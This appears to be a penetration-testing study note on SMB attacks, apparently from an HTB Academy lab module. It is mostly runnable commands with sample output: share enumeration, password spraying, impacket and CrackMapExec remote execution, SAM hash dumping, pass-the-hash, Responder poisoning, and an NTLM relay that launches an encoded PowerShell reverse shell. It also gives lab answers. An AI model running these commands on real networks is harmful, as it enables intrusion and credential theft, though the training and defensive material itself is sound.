# 🔓 SMB (Server Message Block) Attacks

## 🎯 Overview

This document covers **exploitation techniques** against SMB services, focusing on practical attack methodologies from HTB Academy's "Attacking Common Services" module. SMB attacks can lead to **remote code execution, credential theft, lateral movement, and complete system compromise**.

> **"To attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. We can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities."**

## 🏗️ SMB Attack Methodology

### Attack Chain Overview
```
Service Discovery → Misconfiguration Analysis → Authentication Attacks → Privilege Escalation → Lateral Movement
```

### Key Attack Vectors
- **Anonymous Authentication** (Null Sessions)
- **Brute Force & Password Spraying**
- **Remote Code Execution** (PsExec, SMBExec, atexec)
- **Credential Extraction** (SAM Database)
- **Pass-the-Hash Attacks**
- **Forced Authentication** (Responder, NTLM Relay)

---

## 📍 Service Discovery & Enumeration

### Basic SMB Scanning
```bash
# Target ports 139 (NetBIOS) and 445 (SMB)
sudo nmap 10.129.14.128 -sV -sC -p139,445

# Expected output
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

### Key Information to Extract
- **SMB Version** (Samba vs Windows)
- **Hostname** (NetBIOS name)
- **Operating System** (Linux/Windows detection)
- **Message Signing** status
- **SMB Dialect** support

---

## 🔓 Misconfiguration Attacks

### 1. Anonymous Authentication (Null Sessions)

**Target**: SMB servers that don't require authentication

#### File Share Enumeration
```bash
# List shares with null session
smbclient -N -L //10.129.14.128

# Example output
Sharename       Type      Comment
-------         ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share  
notes           Disk      CheckIT
IPC$            IPC       IPC Service (DEVSM)
```

#### Permission Analysis
```bash
# Check permissions for each share
smbmap -H 10.129.14.128

# Example output
Disk                    Permissions     Comment
----                    -----------     -------
ADMIN$                  NO ACCESS       Remote Admin
C$                      NO ACCESS       Default share
IPC$                    READ ONLY       IPC Service (DEVSM)
notes                   READ, WRITE     CheckIT
```

#### Directory Browsing
```bash
# Browse directories recursively
smbmap -H 10.129.14.128 -r notes

# Download files
smbmap -H 10.129.14.128 --download "notes\note.txt"

# Upload files (if WRITE permissions)
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

### 2. RPC Exploitation

#### Null Session RPC Access
```bash
# Connect with null session
rpcclient -U'%' 10.10.110.17

# Common enumeration commands
rpcclient $> enumdomusers     # List domain users
rpcclient $> enumdomgroups    # List domain groups  
rpcclient $> querydominfo     # Domain information
rpcclient $> lookupnames     # Name resolution
```

#### Advanced RPC Operations
- **Change user passwords**
- **Create new domain users**  
- **Create shared folders**
- **Modify system attributes**

### 3. Automated Enumeration
```bash
# Enum4linux - comprehensive SMB enumeration
./enum4linux-ng.py 10.10.11.45 -A -C

# Information gathered:
# - Workgroup/Domain name
# - Users information
# - Operating system information
# - Groups information  
# - Shares folders
# - Password policy information
```

---

## ⚔️ Protocol Specific Attacks

### 1. Brute Force & Password Spraying

> **⚠️ WARNING**: Brute forcing can lock accounts. Use password spraying for safer approach.

#### Password Spraying with CrackMapExec
```bash
# Prepare user list
cat /tmp/userlist.txt
Administrator
jrodriguez
admin
jurena

# Password spray against single target
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

# Expected output for success
SMB    10.10.110.17  445  WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!)
```

#### Best Practices
- **2-3 password attempts max**
- **30-60 minute delays** between attempts
- **Monitor account lockout policies**
- **Use --continue-on-success** for complete enumeration

### 2. Metasploit SMB Login Scanner
```bash
# Launch Metasploit
msfconsole -q
use auxiliary/scanner/smb/smb_login

# Configure options
set rhosts 10.129.167.224
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run

# Expected success output
[+] 10.129.167.224:445 - Success: '.\jason:34c8zuNBo91!@28Bszh'
```

---

## 💻 Remote Code Execution

### 1. PsExec Family Tools

#### Impacket PsExec
```bash
# Basic RCE with valid credentials
impacket-psexec administrator:'Password123!'@10.10.110.17

# Process:
# 1. Deploys service to admin$ share
# 2. Uses DCE/RPC over SMB
# 3. Accesses Windows Service Control Manager
# 4. Creates named pipe for command execution
```

#### Alternative Impacket Tools
```bash
# SMBExec - doesn't use RemComSvc
impacket-smbexec administrator:'Password123!'@10.10.110.17

# AtExec - uses Task Scheduler
impacket-atexec administrator:'Password123!'@10.10.110.17 "whoami"
```

### 2. CrackMapExec RCE
```bash
# Execute single command
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Execute PowerShell commands
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -X 'Get-Process'

# Multiple targets
crackmapexec smb 10.10.110.0/24 -u Administrator -p 'Password123!' -x 'whoami'
```

---

## 🏷️ Credential Extraction & Lateral Movement

### 1. SAM Database Extraction
```bash
# Extract local password hashes
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Example output
SMB    10.10.110.17  445  WIN7BOX  [+] Dumping SAM hashes
SMB    10.10.110.17  445  WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB    10.10.110.17  445  WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

### 2. Pass-the-Hash (PtH) Attacks
```bash
# Authenticate using NTLM hash instead of password
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

# PtH with Impacket tools
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe administrator@10.10.110.17
```

### 3. Logged-on Users Enumeration
```bash
# Find logged-on users across network
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Output shows active sessions for lateral movement targeting
SMB    10.10.110.17  445  WIN7BOX  WIN7BOX\jurena    logon_server: WIN7BOX
SMB    10.10.110.21  445  WIN10BOX WIN10BOX\demouser logon_server: WIN10BOX
```

---

## ��️ Forced Authentication Attacks

### 1. Responder - LLMNR/NBT-NS Poisoning

#### Setup Responder
```bash
# Start Responder on interface
sudo responder -I ens33

# Services automatically enabled:
# - LLMNR, NBT-NS, MDNS poisoning
# - Fake SMB, HTTP, HTTPS servers
# - Kerberos, SQL, FTP servers
```

#### Attack Scenario
```
1. User mistypes share name: \\mysharefoder\ instead of \\mysharedfolder\
2. Name resolution fails
3. Machine sends multicast query
4. Responder responds with attacker IP
5. Victim connects to fake SMB server
6. NetNTLMv2 hash captured
```

#### Captured Credentials Example
```
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:...
```

### 2. Hash Cracking
```bash
# Crack NetNTLMv2 with hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Example successful crack
ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:...:P@ssword
```

### 3. NTLM Relay Attacks

#### Setup NTLM Relay
```bash
# Disable SMB in Responder config
cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off

# Setup relay to target
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

#### Advanced Relay with Commands
```bash
# Execute PowerShell reverse shell via relay
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 \
-c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...'

# Result: NT AUTHORITY\SYSTEM shell
```

---

## 📝 Skills Assessment Examples

### Example 1: Share Discovery
**Task**: Find shared folder with READ permissions

```bash
# Use enum4linux to enumerate shares
enum4linux 10.129.203.6

# Look for share mappings
//10.129.203.6/GGJ    Mapping: OK, Listing: OK

# Answer: GGJ
```

### Example 2: Password Brute Force
**Task**: Find password for username "jason"

```bash
# Metasploit brute force
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhosts 10.129.167.224
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run

# Success result
[+] 10.129.167.224:445 - Success: '.\jason:34c8zuNBo91!@28Bszh'
```

### Example 3: SSH Key Extraction
**Task**: Login via SSH and find flag

```bash
# Access SMB share with found credentials
smbclient -U jason //10.129.137.91/GGJ

# Download SSH key
smb: \> get id_rsa
smb: \> exit

# Set permissions and connect
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.137.91

# Find flag
cat flag.txt
# HTB{...}
```

---

## 🛡️ Defense & Mitigation

### SMB Security Hardening
- **Disable SMBv1** protocol
- **Enable SMB signing** (mandatory)
- **Restrict anonymous access**
- **Implement strong authentication**
- **Monitor SMB traffic**
- **Segment network** properly

### Detection Strategies
- **Monitor failed authentication attempts**
- **Alert on suspicious SMB connections**
- **Track administrative share access**
- **Log RPC operations**
- **Detect LLMNR/NBT-NS traffic**

---

## 🔗 Related Techniques

- **[SMB Enumeration](../services/smb-enumeration.md)** - Information gathering techniques
- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - Credential reuse attacks
- **[Network Services](../services/)** - Other protocol attacks
- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain exploitation

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **Impacket Documentation** - Python SMB tools
- **CrackMapExec Wiki** - Advanced SMB testing
- **Responder Documentation** - LLMNR/NBT-NS poisoning
- **Microsoft SMB Protocol** - Official specifications
